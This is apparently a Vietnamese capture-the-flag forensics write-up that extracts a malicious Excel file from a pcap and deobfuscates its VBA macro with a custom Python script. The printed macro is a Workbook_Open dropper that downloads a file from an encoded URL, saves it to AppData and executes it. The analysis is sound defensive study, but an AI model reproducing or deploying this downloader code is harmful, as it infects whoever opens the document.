![Screenshot (4452)](https://github.com/NVex0/uWU/assets/113530029/fb8ee111-d71e-48de-9d56-2cae5b023c32)

#### Solve:

Vẫn là Hoà và tài liệu độc hại của anh ấy. Đề cho ta 1 file pcap, dựa theo mô tả của đề thì có vẻ đây là capture của traffic khi thầy giáo nhận file độc từ Hoà. Mình sẽ extract tài liệu đó trên HTTP object list:

![Screenshot (4453)](https://github.com/NVex0/uWU/assets/113530029/20002710-b291-49fc-bccd-5a397f6e3ba2)

 `olevba` đầu tiên thôi :v: :

![image](https://github.com/NVex0/uWU/assets/113530029/34ed6a24-738b-486d-9a8d-bbb22ccb5964)

Ta thấy đoạn malicious code này bị obfuscate khá đau mắt, tuy nhiên để ý thì có vẻ như nó chỉ bị obfu bằng xài mấy tên biến non-ascii kì cục :v 

Mình code script đểu sau để nhìn VB code dễ hơn:

```
with open("data.txt", "rb") as f:
    data = f.read()
#ascii 32-126.
variablelist = []
nonasc = []
valuelist = []
gapphay = False
cmcheck = True
final = ""

for i in data:
    if not gapphay:
        if i == 10 or i == 13:
            #Xử lí xuống dòng.
            final += "\n"
            continue

        if i in range(32, 127):
            if i == 34:
                gapphay = True

            tmpstr = ""
            for j in nonasc:
                tmpstr += str(j) + " "
            variablelist.append(tmpstr)
            final += tmpstr
            nonasc = []
            
            final += chr(i)
        else:
            nonasc.append(i)
    
    else:
        if i == 34:
            for j in valuelist:
                if j not in range(32, 127):
                    cmcheck = False
            if cmcheck:
                for j in valuelist:
                    final += chr(j)
            else:
                for j in valuelist:
                    final += str(j) + " "
            cmcheck = False
            valuelist = []
            gapphay = False
            final += chr(i)
        else:
            valuelist.append(i)

newl = []
for i in variablelist:
    if len(i) != 0:
        newl.append(i)

numb = 0
for z in newl:
    if z in final:
        final = final.replace(z, f'var{str(numb)}')
        numb += 1
print(final)
```

Đầu ra của code trên sẽ replace hết tên biến trùng nhau về thành `var + số`. Còn những value không trùng thì mình để ở nguyên dạng decimal :v 

Đầu ra của mình thế này:

```
Function var0(var1)
var2 = "32 63 33 64 35 36 37 94 38 42 40 41 95 43 124 48 49 50 51 52 53 54 55 56 57 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 46 44 45 126 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 194 191 194 161 194 178 194 179 195 128 195 129 195 130 195 131 195 132 195 133 195 146 195 147 195 148 195 149 195 150 195 153 195 155 195 156 195 160 195 161 195 162 195 163 195 164 195 165 195 152 194 182 194 167 195 154 194 165 "
var3 = "195 163 88 76 49 108 89 85 126 195 153 195 164 44 67 97 194 178 90 102 195 131 64 100 79 45 99 113 194 179 195 161 195 149 115 195 132 74 86 57 65 81 110 118 98 106 48 195 133 55 87 73 33 82 66 103 194 167 72 111 63 75 95 70 51 46 195 147 112 194 165 195 150 101 80 195 162 122 107 194 182 195 155 78 195 152 37 71 32 109 195 156 94 77 38 43 194 161 35 52 41 117 195 128 114 116 56 40 195 146 83 119 124 84 42 195 130 36 69 195 165 121 104 105 195 154 120 54 53 68 195 160 194 191 50 195 129 195 148 "
For y = 1 To Len(var1)
var4 = InStr(var2, Mid(var1, y, 1))
If var4 > 0 Then
var5 = Mid(var3, var4, 1)
var6 = var6 + 
var5Else
var6 = var6 + Mid(var1, y, 1)
End If
Next
var0 = 
var6For var7 = 1 To Len(var8)
var8 = 
var7Next
For var9 = 2 To Len(var10)
var10 = 2
Next
For var11 = 3 To Len(var12)
var12 = 
var11Next
For var13 = 4 To Len(var14)
var14 = 2
Next
End Function
Sub Workbook_Open()
Dim var15 As Object
Dim var16 As String
Dim var17 As String
Dim var18 As String
Dim var19 As Integer
var19 = Chr(50) + Chr(48) + Chr(48)
Set var15 = CreateObject("87 83 99 114 105 112 116 46 83 104 101 108 108 ")
var16 = var15.SpecialFolders("65 112 112 68 97 116 97 ")
Dim 
var20Dim 
var21Dim 
194 162 var4194 182 Dim var7 As Long
Dim var9 As String
Dim var22 As Long
Dim var12 As String
Dim var11 As Long
Dim var13 As String
Dim var23 As String
Dim var10 As Long
Dim 
var24Dim 
var25Dim var26 As Integer
Dim 
194 179 194 175 194 189 194 176 var25194 185 194 164 194 190 194 189 194 179 194 165 194 184 194 178 Dim 
194 174 194 172 194 174 194 171 194 187 194 183 194 187 194 162 194 182 194 182 194 191 194 174 194 171 194 190 194 162 194 183 194 179 194 167 194 189 194 191 194 164 194 189 194 191 194 167 194 161 194 188 194 171 194 188 194 180 194 170 194 179 194 178 194 172 194 184 194 174 194 186 194 188 194 164 194 188 194 172 194 191 194 165 194 167 194 183 194 171 194 180 194 161 194 164 194 180 194 189 194 168 194 181 194 163 194 179 194 175 194 189 194 176 194 178 194 170 194 178 194 181 194 186 194 180 194 169 194 164 194 163 194 164 194 161 194 189 194 175 194 170 194 184 194 175 194 191 194 166 194 164 194 162 194 167 194 184 194 174 194 188 194 179 194 168 194 166 194 182 194 168 194 165 194 179 194 176 194 169 var26 = 1
Range("65 49 ").Value = var0("52 66 69 105 195 160 105 117 80 51 120 54 194 191 81 69 105 194 179 ")
Dim var27 As String
var28 = "36 120 194 191 80 195 156 95 106 69 80 107 69 69 105 80 195 156 95 54 73 69 51 80 95 105 51 80 195 155 120 194 191 194 178 80 195 160 81 66 120 194 178 194 179 95 105 194 179 80 51 120 54 194 191 81 69 105 194 179 98 80 195 156 95 106 69 80 107 69 69 105 80 98 194 179 120 35 69 105 114 " & vbCrLf & "195 146 120 80 194 178 69 194 179 194 178 195 160 69 106 69 80 194 179 195 156 69 98 69 80 51 95 194 179 95 40 80 195 155 120 194 191 80 95 194 178 69 80 194 178 69 55 194 191 195 160 194 178 69 51 80 194 179 120 80 194 179 194 178 95 105 98 48 69 194 178 80 64 109 109 73 80 194 179 120 80 194 179 195 156 69 80 48 120 35 35 120 195 132 195 160 105 117 80 107 95 105 73 80 95 54 54 120 194 191 105 194 179 80 105 194 191 81 107 69 194 178 58 80 " & vbCrLf & "64 109 64 109 64 109 111 64 64 194 167 109 109 109 " & vbCrLf & "103 54 54 120 194 191 105 194 179 80 195 156 120 35 51 69 194 178 58 80 76 117 194 191 195 155 69 105 80 195 146 195 156 95 105 195 156 80 33 120 105 117 " & vbCrLf & "116 95 105 73 58 80 84 116 80 116 95 105 73 "
var27 = var0(var28)
MsgBox var27, vbInformation, var0("112 69 80 51 69 69 66 35 195 155 80 194 178 69 117 194 178 69 194 179 80 194 179 120 80 195 160 105 48 120 194 178 81 80 195 155 120 194 191 ")
Dim var29 As Date
Dim var30 As Date
var29 = Date
var30 = DateSerial(2023, 6, 6)
If var29 < var30 Then
Set 194 179 194 175 194 189 194 176 var25194 185 194 164 194 190 194 189 194 179 194 165 194 184 194 178  = CreateObject("109 105 99 114 111 115 111 102 116 46 120 109 108 104 116 116 112 ")
Set var25 = CreateObject("83 104 101 108 108 46 65 112 112 108 105 99 97 116 105 111 110 ")
var24 = var16 + var0("92 107 194 191 105 54 195 156 95 126 66 98 64 ")
194 179 194 175 194 189 194 176 var25194 185 194 164 194 190 194 189 194 179 194 165 194 184 194 178 .Open "103 101 116 ", var0("195 156 194 179 194 179 66 98 58 47 47 117 195 160 98 194 179 126 117 195 160 194 179 195 156 194 191 107 194 191 98 69 194 178 54 120 105 194 179 69 105 194 179 126 54 120 81 47 107 55 194 191 95 105 81 95 105 47 102 195 128 51 95 111 45 51 89 102 48 95 69 54 109 54 107 107 51 95 107 109 194 167 51 89 48 51 195 128 89 95 51 95 95 47 194 178 95 195 132 47 195 128 51 69 195 128 107 102 109 102 195 128 64 69 195 163 195 163 111 195 163 195 164 194 167 107 64 95 64 195 163 48 195 164 54 95 69 51 45 195 163 89 48 51 54 45 64 64 107 111 111 47 95 195 128 109 98 54 109 64 194 167 126 66 98 64 "), False
194 179 194 175 194 189 194 176 var25194 185 194 164 194 190 194 189 194 179 194 165 194 184 194 178 .send
var21 = 194 179 194 175 194 189 194 176 var25194 185 194 164 194 190 194 189 194 179 194 165 194 184 194 178 .responseBody
If 194 179 194 175 194 189 194 176 var25194 185 194 164 194 190 194 189 194 179 194 165 194 184 194 178 .Status = 200 Then
Set var20 = CreateObject("97 100 111 100 98 46 115 116 114 101 97 109 ")
var20.Open
var20.Type = 
var26var20.Write 
var21var20.SaveToFile var24, var26 + 
var26var20.Close
End If
var25.Open (var24)
Else
MsgBox var0("195 165 120 105 39 194 179 80 194 179 194 178 195 155 80 194 179 120 80 194 178 194 191 105 80 81 69 80 107 194 178 120 ")
End If
End Sub
```

Đầu tiên với hàm `var0`, ta thấy nó nhận vào 1 chuỗi, trả về kí tự index thứ `var4` trên `var3`. `var4` là kết quả từ việc match xem kí tự lần đầu của chuỗi xuất hiện trong `var2` là ở đâu. Lặp liên tục trên len của chuỗi đầu vào, hàm trả về cho ta 1 string.

Code chỉ có 1 hàm duy nhất và được gọi đến cơ số lần :v, và cũng như đề cập trên, value duy nhất trong code mình để nguyên ở decimal. Ta tiến hành làm việc với mớ đó thôi.

Vì kí tự đặc biệt mình cũng không biết xử lý sao nữa, nên đành phải dò để copy value từ code VB gốc về :(
